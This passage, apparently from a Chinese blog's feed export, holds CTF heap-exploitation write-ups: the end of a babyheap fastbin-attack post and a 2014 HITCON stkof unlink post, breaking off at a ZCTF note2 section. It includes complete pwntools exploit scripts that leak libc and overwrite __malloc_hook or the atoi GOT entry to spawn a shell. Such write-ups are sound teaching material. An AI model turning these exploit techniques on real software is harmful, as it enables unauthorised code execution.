class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = read_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = LODWORD(a1[(<span class="keyword">int</span>)result].inuse);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = read_num();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = read_content(a1[v2].ptr, v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写任意长度，堆溢出，原来想unlink发觉没全局变量</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">free_chunk</span><span class="params">(chunk *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = read_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = LODWORD(a1[(<span class="keyword">int</span>)result].inuse);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(a1[v2].inuse) = <span class="number">0</span>;</span><br><span class="line">      a1[v2].size = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(a1[v2].ptr);</span><br><span class="line">      result = (__int64)&amp;a1[v2];</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free后没有置空，存在double free</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>这道题我原来觉得很简单，后面自己做起来才发觉问题较多，不是难，而是细节性的问题比较多</li><li>大体思路是构造unsortbin泄露libc地址，然后通过覆盖malloc_hook成one_gadget拿到shell</li><li>细节点1：你会发觉这道题你没有全局变量，所以要在堆上做文章，通过连续free两个chunk，第一个free的chunk的fd会指向第二个</li><li>细节点2：要绕过fastbin的长度检测，所以要多次溢出修改size，这里我建议不要急着free，我自己做的时候先free就出错了</li><li>细节点3： idx问题， 要注意标记好idx，不然自己都不知道哪个对应哪个</li><li>具体在exp里在标注下注释就好了</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'babyheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'babyheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>)</span><br><span class="line">    Dump(<span class="number">0</span>)</span><br><span class="line">    Fill(<span class="number">0</span>, <span class="number">0x10</span>, <span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#test()</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">    Allocate(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#细节点1</span></span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span class="line">    Free(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">    Fill(<span class="number">0</span>, len(payload), payload)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    <span class="comment">#细节点2</span></span><br><span class="line">    Fill(<span class="number">3</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">    Allocate(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    <span class="comment">#细节点2</span></span><br><span class="line">    Fill(<span class="number">3</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">    Free(<span class="number">4</span>) </span><br><span class="line">    Dump(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> %malloc_hook)</span><br><span class="line">    one_gadget = <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = <span class="number">0x4526a</span> <span class="comment">#0xf02a4 0xf1147</span></span><br><span class="line">    one_gadget = one_gadget + libc_base </span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    Free(<span class="number">4</span>)</span><br><span class="line">    payload = p64(ptr)</span><br><span class="line">    Fill(<span class="number">2</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    Allocate(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">    Fill(<span class="number">6</span>, len(payload), payload)</span><br><span class="line">    Allocate(<span class="number">0x20</span>) <span class="comment">#7</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>fastbin的题目相对来说不难，可能是因为前面有基础了的原因了吧，以后多做下题巩固下就好</li><li>double free也是常用的攻击手段</li><li>逆向还得多学习，像搜索引擎那题，看都看不懂题目，做什么题。。。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvZmFzdGJpbl9hdHRhY2stemgv" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/">ctf-wiki<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/1d71df53/">https://noone-hub.github.io/posts/1d71df53/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程4</title>
    <url>/posts/6a76efc5/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程4"><a href="#pwn堆入门系列教程4" class="headerlink" title="pwn堆入门系列教程4"></a>pwn堆入门系列教程4</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span></p><p>序言：这次进入到unlink的学习了，unlink在第一节已经用上了，但我用起来还不是很流畅，还是去翻了第一节的笔记，最主要是指针的问题，可能没学好指针，理解了unlink后就简单做了</p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>几乎无输出的题目</li><li>申请功能，申请指定大小size</li><li>删除功能，删除idx位置处的chunk</li><li>输出一些无用字符串，有个strlen，本来想用来做/bin/sh的，发觉也不行</li><li>编辑功能</li></ol><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">fill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  idx = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  size = atoll(&amp;s);</span><br><span class="line">  ptr = globals[idx];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, size, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    size -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fill函数里也就是编辑功能处可以自定大小编辑，也就是说存在堆溢出</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这里有个小细节，自己补充下知识，关于缓冲区的问题，这个细节也解决了我自己出pwn题的时候输出，为什么输出不了的问题<br>就是如果未设置缓冲区为0的话，这道题里是第一次调用fgets是要先申请1024大小的堆块作为缓冲区的，还有printf也要申请1024大小的堆块作为缓冲区</p><p><span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQ1MC8=" title="https://paper.seebug.org/450/">知道创宇讲解的一道题目<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdW5saW5rLXpoLw==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">ctf-wiki讲解这部分知识<i class="fa fa-external-link"></i></span></p><ol><li>首先先申请一块内存，冲掉printf和fgets所需缓冲区</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#idx1</span></span><br></pre></td></tr></table></figure><ol start="2"><li>是unlink部分，当然用unlink方法来解了，第一节学过了，伪造一个chunk，然后通过溢出覆盖第二个堆块的pre_size和size，在free第二个堆块的时候就会unlink我们的伪造的p堆块</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x20f7560-0x30</span><br><span class="line">0x20f7530:	0x0000000000000000	0x0000000000000041 <span class="comment">#chunk2</span></span><br><span class="line">0x20f7540:	0x0000000000000000	0x0000000000000030 <span class="comment">#p</span></span><br><span class="line">0x20f7550:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x20f7560:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f7570:	0x0000000000000030	0x0000000000000090 <span class="comment">#chunk3</span></span><br><span class="line">0x20f7580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f7590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>这里已经溢出覆盖掉chunk3的size了<br>其实unlink已经说过一次了，</p><ul><li>首先，第一步要过掉unlink的size检测，覆盖chunk3的pre_size为fake_chunk大小</li><li>其次chunk3的insue位要为0，标志前面一个堆块未在使用当中</li><li>然后关键点就是伪造fd跟bk了</li><li>在第一点中我将ptr设置为global+0x10意思就是第二块堆块地址，这就是存放p的地方</li><li>unlink第一步 FD = p-&gt;fd = ptr-0x18</li><li>unlink第二步 BK=p-&gt;bk = ptr-0x10</li><li>unlink第三步 判断FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p ?</li><li>过了检验后</li><li>FD-&gt;bk = * (ptr-0x18 + 0x18 )= BK = ptr -0x10</li><li>BK-&gt;fd = * (ptr-0x10+0x10) = FD = ptr-0x18<br>最终结果就是*ptr = ptr-0x18，而ptr是0x0000000000602150故最终就是将global+0x10处的值改为0x602138<br>然后我们在编辑第二块的时候实际上就是编辑0x602138处，也就是global-0x8处</li></ul><ol start="3"><li>泄露地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got) <span class="comment">#这里对应的是第一块堆块，第二块，第三块和第四块</span></span><br><span class="line">fill(<span class="number">2</span>, payload) </span><br><span class="line">fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br></pre></td></tr></table></figure><p>没什么好说的啊，覆写got表为put泄露地址</p><ol start="4"><li>最后我修改atoi为system，因为输入的会经过atoi转换，所以输入的就是system参数</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(io)</span><br><span class="line">fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'stkof'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'stkof'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(len(content)))</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">    <span class="comment">#for buffer</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x100</span>) <span class="comment">#idx1   </span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">    alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    fill(<span class="number">2</span>, payload)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">    payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got)</span><br><span class="line">    fill(<span class="number">2</span>, payload) </span><br><span class="line">    fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdW5saW5rLXpoLw==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">ctf-wiki讲解<i class="fa fa-external-link"></i></span></p><p>我只讲差异，里面有的我就不讲了，我只发现了这个漏洞点<br>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。<br>然后我并不会利用这个，本来想利用chunk extends上一节学的，发觉他free后的大小不怎么对，到时看下源码吧，他free后的chunk大小不是合并后的大小，最后看到了大佬讲解的那个0，然后通过-1转成无符号整数，这个我自己查看的时候看不出</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>第一步构造unlink，原理上一节弄过了，所以感觉这次顺畅好多</p><figure class="highlight python"><table><tr><td 